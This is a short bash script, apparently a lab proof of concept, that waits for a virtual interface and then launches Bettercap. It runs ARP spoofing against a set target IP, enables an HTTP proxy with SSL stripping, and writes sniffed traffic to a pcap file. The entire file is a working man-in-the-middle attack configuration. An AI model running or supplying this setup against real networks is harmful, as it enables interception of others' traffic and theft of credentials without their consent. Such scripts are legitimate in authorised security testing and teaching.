#!/bin/bash
# bettercap_launch.sh
# Waits for v_eth0 to exist, then launches Bettercap for SSL stripping PoC

IFACE="v_eth0"
LOGFILE="sslstrip_post.pcap"
TARGET_IP="10.200.200.2"

read -p "Enter log file name (default: sslstrip_post.pcap): " input_log

# Set defaults if user input is empty
LOGFILE="${input_log:-sslstrip_post.pcap}"

echo "[*] Waiting for interface $IFACE..."
while ! ip link show $IFACE > /dev/null 2>&1; do
  sleep 1
done

echo "[*] Interface $IFACE detected. Launching Bettercap..."
sudo bettercap -iface "$IFACE" -eval "
set http.proxy.port 8080;
set http.proxy.sslstrip true;
set net.sniff.output $LOGFILE;
set arp.spoof.targets $TARGET_IP;
arp.spoof on;
http.proxy on;
net.sniff on;
"
